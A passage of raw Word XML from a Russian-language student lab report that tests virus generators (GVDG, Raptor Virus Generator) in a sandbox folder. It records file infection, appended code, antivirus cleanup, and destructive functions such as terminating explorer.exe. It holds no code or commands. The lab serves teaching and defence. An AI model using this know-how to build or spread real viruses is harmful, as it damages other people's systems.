        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidR="002E202B">
        <w:t xml:space="preserve"> Свойства исходных файлов</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233BAB39" w14:textId="77777777" w:rsidR="00FF5DFA" w:rsidRPr="00FF5DFA" w:rsidRDefault="00FF5DFA" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7096F450" w14:textId="6905F65C" w:rsidR="007F10B1" w:rsidRDefault="00B20AF5" w:rsidP="004E5FC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После запуска вируса сработали все деструктивные функции. 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_Ref100618760 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457"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r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>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 отражает увеличение размера исходных файлов.</w:t>
      </w:r>
      <w:r w:rsidR="009F4128">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF84FC0" w14:textId="24C90D67" w:rsidR="007F10B1" w:rsidRPr="007F10B1" w:rsidRDefault="007F10B1" w:rsidP="004E5FC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Затем в текущий каталог (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>virus_disk_test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>) был добавлен еще один</w:t>
      </w:r>
      <w:r w:rsidR="000C6E86">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> незараженный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exe</w:t>
      </w:r>
      <w:r w:rsidRPr="000C6E86">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>файл</w:t>
      </w:r>
      <w:r w:rsidR="000C6E86">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>. При запуске зараженного файла незараженный также оказался под влиянием вируса (</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102681978 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="000C6E86">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC4985F" w14:textId="6641FE88" w:rsidR="00B20AF5" w:rsidRDefault="00507CA0" w:rsidP="004E5FC2">
      <w:pPr>
        <w:keepNext/>
        <w:suppressAutoHyphens/>
      </w:pPr>
      <w:r w:rsidRPr="00507CA0">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r w:rsidR="00B20AF5" w:rsidRPr="00B20AF5">
        <w:rPr>
          <w:rFonts w:eastAsia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A6D50FB" wp14:editId="0FEDA0A6">
            <wp:simplePos x="1480185" y="718185"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5191200" cy="3517200"/>
            <wp:effectExtent l="0" t="0" r="0" b="762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AFBF3" w14:textId="04E2E583" w:rsidR="00B20AF5" w:rsidRDefault="00507CA0" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00507CA0">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00B20AF5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkStart w:id="3" w:name="_Ref100618760"/>
      <w:r w:rsidR="00B20AF5"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3</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
      <w:r w:rsidR="00B20AF5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidR="00B20AF5">
        <w:t xml:space="preserve"> Свойства зараженных файлов</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B74C04" w14:textId="32531618" w:rsidR="000C6E86" w:rsidRDefault="000C6E86" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AB6A3A1" w14:textId="0A57172C" w:rsidR="000C6E86" w:rsidRDefault="00507CA0" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00507CA0">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="000C6E86" w:rsidRPr="000C6E86">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251661312" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7683D4D7" wp14:editId="251ACB15">
            <wp:simplePos x="1436370" y="718185"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4672800" cy="4183200"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:wrapTopAndBottom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41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366D1" w14:textId="42EFBE57" w:rsidR="000C6E86" w:rsidRDefault="00507CA0" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="565" w:firstLine="286"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00507CA0">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="000C6E86">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:bookmarkStart w:id="4" w:name="_Ref102681978"/>
      <w:r w:rsidR="000C6E86"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4</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
      <w:r w:rsidR="000C6E86">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidR="000C6E86">
        <w:t xml:space="preserve"> Заражение файла из-за запуска файла с вирусом</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC4B8D8" w14:textId="5D621C55" w:rsidR="000C6E86" w:rsidRDefault="000C6E86" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="565" w:firstLine="286"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67123FFE" w14:textId="5B9A5AC1" w:rsidR="00607841" w:rsidRDefault="00607841" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">С помощью программы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Total</w:t>
      </w:r>
      <w:r w:rsidRPr="009B3FD3">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Commander</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> было проведено сравнение исходного кода </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exe</w:t>
      </w:r>
      <w:r w:rsidRPr="009F4128">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>файла с кодом зараженного файла (</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref100619205 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> Можно сделать вывод о том, что сгенерированный вирус </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>дописал свой код в файл. Поэтому файл может быть вылечен антивирусом, например, встроенным в GVDG (</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref100619649 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref100619872 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> говорит о том, что размеры файлов восстановились.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E5D467" w14:textId="77777777" w:rsidR="00607841" w:rsidRDefault="00607841" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="565" w:firstLine="286"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42660CD1" w14:textId="4AC1A1F3" w:rsidR="009B3FD3" w:rsidRDefault="00E20278" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="009B3FD3">
        <w:rPr>
          <w:rFonts w:eastAsia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4967B38" wp14:editId="749DED5A">
            <wp:simplePos x="848995" y="718185"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5842800" cy="3286800"/>
            <wp:effectExtent l="0" t="0" r="5715" b="889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8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9C86D" w14:textId="26AA70F7" w:rsidR="009B3FD3" w:rsidRDefault="009B3FD3" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="565"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Ref100619205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5</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сравнение эталонного файла с зараженным</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F91D23" w14:textId="67DFBF73" w:rsidR="009F4128" w:rsidRDefault="009F4128" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="565"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66D3CA3D" w14:textId="445DB1A0" w:rsidR="009F4128" w:rsidRDefault="00E20278" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="565"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009F4128">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251663360" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="75EF1522" wp14:editId="69A79E10">
            <wp:simplePos x="1664970" y="5311775"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>-3810</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4071600" cy="2811600"/>
            <wp:effectExtent l="0" t="0" r="5715" b="825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00" cy="28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82A9" w14:textId="4376FD92" w:rsidR="009F4128" w:rsidRDefault="009F4128" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Ref100619649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6</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Лечение зараженных файлов</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDD7E73" w14:textId="77777777" w:rsidR="00E20278" w:rsidRDefault="00E20278" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="391E7E4A" w14:textId="77777777" w:rsidR="00E20278" w:rsidRDefault="00E20278" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="422"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="631A4E15" wp14:editId="3C39D4A8">
            <wp:extent cx="4470400" cy="398145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4D09" w14:textId="18A04DB5" w:rsidR="00E20278" w:rsidRDefault="00E20278" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981" w:firstLine="143"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Ref100619872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7</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Свойства вылеченных файлов</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609C8957" w14:textId="5C24F28E" w:rsidR="007F10B1" w:rsidRDefault="00607841" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="36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Затем вылеченные файлы были проверены антивирусом, который не обнаружил угроз в файлах. Значит, лечение прошло успешно.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143B3FF9" w14:textId="77777777" w:rsidR="00507CA0" w:rsidRDefault="00BC29C3" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/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497E7037" wp14:editId="0F9EFF32">
            <wp:simplePos x="1262743" y="2960914"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>3810</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5209200" cy="5306400"/>
            <wp:effectExtent l="0" t="0" r="0" b="889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53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188A" w14:textId="641DB540" w:rsidR="00BC29C3" w:rsidRDefault="00507CA0" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
      <w:bookmarkStart w:id="8" w:name="_Ref102682908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8</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
      <w:r w:rsidRPr="00507CA0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidRPr="00507CA0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Блок-схема работы вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56EFBEC2" w14:textId="7D977F70" w:rsidR="00583F89" w:rsidRDefault="00583F89" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B60501E" w14:textId="2C93CC66" w:rsidR="00B57749" w:rsidRDefault="00B57749" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Далее </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">был запущен генератор вирусов </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Raptor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Virus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Generator</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> и создан вирус со следующими деструктивными функциями</w:t>
      </w:r>
      <w:r w:rsidR="006C5B47">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102651497 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102651509 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="006C5B47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: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BEE158C" w14:textId="72BE877F" w:rsidR="00B57749" w:rsidRDefault="00B57749" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:num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завершение работы с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>explorer</w:t>
      </w:r>
      <w:r w:rsidRPr="00B57749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exe</w:t>
      </w:r>
      <w:r w:rsidRPr="00B57749">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12610089" w14:textId="74B6C06E" w:rsidR="00B57749" w:rsidRDefault="00B57749" w:rsidP="004E5FC2">
